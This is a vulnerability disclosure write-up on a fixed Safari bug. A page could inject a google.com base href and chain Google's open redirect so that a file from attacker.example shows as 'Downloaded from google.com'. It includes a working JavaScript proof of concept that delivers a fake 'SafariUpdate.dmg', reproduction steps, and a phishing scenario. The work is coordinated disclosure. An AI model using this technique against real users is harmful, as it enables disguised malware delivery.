# Spoofing Safari's Download Origin with an Open Redirect + `<base href>`

*Shobhit Srivastava ([@sho3hit](https://github.com/sho3hit))*

> **TL;DR** — Safari attributed a file's download origin to the URL that *initiated*
> the navigation rather than the server that *actually served the file*. By combining
> a `<base href>` pointing at a trusted domain with that domain's own open-redirect
> endpoint, an attacker-hosted page could make Safari's Downloads window show a file
> as "Downloaded from google.com" while the bytes came from an attacker server. Apple
> addressed this in iOS 27, iPadOS 27, and macOS 27.

---

## Status

| | |
|---|---|
| **Reported** | 19 May 2026 (Apple report `OE1106072398846`) |
| **Reported on** | Safari, iOS 26.4.2 (iPhone 13); reproduced on macOS |
| **Fixed in** | iOS 27, iPadOS 27, macOS 27 |
| **Recognition** | Apple security advisories [149034](https://support.apple.com/149034), [149035](https://support.apple.com/149035), [149039](https://support.apple.com/149039) |
| **Class** | UI / trust-indicator spoofing (download origin attribution) |

---

## Why download origin matters

When Safari finishes a download it records where the file came from and shows it to
the user — most visibly in the **Downloads** popover ("Downloaded from `example.com`").
That string is a trust signal. Security guidance everywhere tells users to check the
source before opening an installer, and `.dmg` / `.pkg` files are exactly the case
where a user leans on "…but it says it's from Apple" before double-clicking.

If that string can be controlled by the attacker while the file is served from
somewhere else, the trust signal is worse than useless — it actively vouches for a
malicious file.

## Root cause

The origin shown for a download was derived from the **initiating navigation URL**,
not the **final URL that delivered the bytes** after redirects resolved. Anything
that let an attacker make the *initiating* URL look like it belonged to a trusted
domain — while the *final* hop pointed at their own server — desynchronised the
displayed origin from reality.

## The technique

The reliable path chains two ordinary primitives:

1. **`<base href>` injection** — set the document's base URL to a trusted domain so
   that a *relative* link resolves against it.
2. **A trusted domain's open redirect** — `https://www.google.com/url?q=<target>` is
   a well-known Google redirect endpoint. A relative link `url?q=<target>` resolved
   against the injected base becomes `https://www.google.com/url?q=<target>`.

So the link the browser *starts* from is genuinely on `google.com`; the redirect then
carries the request onward to the attacker's file. Safari recorded the first URL in
the chain as the origin.

```html
<script>
  // 1. Point the document's base at a trusted domain
  const base = document.createElement('base');
  base.href = 'https://www.google.com/';
  document.head.appendChild(base);

  // 2. Relative link resolves to google.com's open-redirect endpoint,
  //    which forwards to the attacker-hosted file.
  const attackerFile = 'https://attacker.example/SafariUpdate.dmg';
  const a = document.createElement('a');
  a.href = 'url?q=' + encodeURIComponent(attackerFile); // -> google.com/url?q=...
  a.download = 'SafariUpdate.dmg';
  document.body.appendChild(a);
  a.click();

  // Safari's Downloads window: "Downloaded from google.com"
  // Actual bytes:              attacker.example
</script>
```

The trusted domain is interchangeable — any host with an open redirect works, which
is why "downloaded from apple.com / microsoft.com / github.com" are all in reach.

### Variants I looked at (and their honest status)

- **Userinfo confusion** — `https://www.google.com@attacker.example/file.dmg`. Modern
  Safari resolves the real host (`attacker.example`), so this did **not** reliably
  drive the displayed origin. Included for completeness, not as a working vector.
- **Multi-hop redirect chains** — a trusted-domain redirect forwarding to the
  attacker host behaves the same way as the `<base href>` case: the first URL in the
  chain is what gets recorded. Same root cause, different entry point.

## Impact

This is a **UI trust-indicator spoof**, and I'm scoping the impact to exactly that —
nothing here required or demonstrated a Gatekeeper bypass or persistent metadata
poisoning, so I don't claim one.

What it does give an attacker is a clean social-engineering primitive:

- A file the user chose to download shows a **trusted domain** as its source in the
  place users are told to check.
- No warning or interstitial is shown.
- It's most dangerous for `.dmg`, `.pkg`, `.app`, and `.command` payloads, where the
  "where did this come from?" check is the main thing standing between the user and
  running an installer.

A realistic chain: a phishing page themed as a "Safari security update" triggers the
download; the Downloads popover says *google.com* (or *apple.com*); the user's source
check passes; they run the installer. The spoof turns the browser's own trust UI into
part of the lure.

**Severity note.** Spoofing bugs map poorly onto CVSS because they don't directly
break confidentiality/integrity/availability — the harm is the deception and the
follow-on social engineering. A defensible framing is *Medium*
(`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`): remote, low-complexity, but it needs the
user to proceed with the download. The value is as a phishing amplifier, not a
memory-safety bug.

## Steps to reproduce

1. Host a page containing the PoC script above (any static host works).
2. Open it in Safari (macOS or iOS).
3. Trigger the download.
4. Open the **Downloads** popover (⌘⇧L on macOS).
5. Observe the source shown as the trusted domain, while the file was served from the
   attacker host.

## Remediation

Attribute a download's origin to the **final response URL** that actually delivered
the bytes, after all redirects and any `<base>`-relative resolution — not to the
initiating link. Where a redirect crosses an origin, the delivering origin is the
honest thing to display.

## Disclosure timeline

| Date | Event |
|---|---|
| 19 May 2026 | Reported to Apple (`OE1106072398846`) |
| 2026 | Addressed in iOS 27, iPadOS 27, macOS 27 |
| 2026 | Recognized in Apple advisories 149034 / 149035 / 149039 |

---

*Reported through the Apple Security Research program. Thanks to Apple Product
Security for the fix and coordination.*
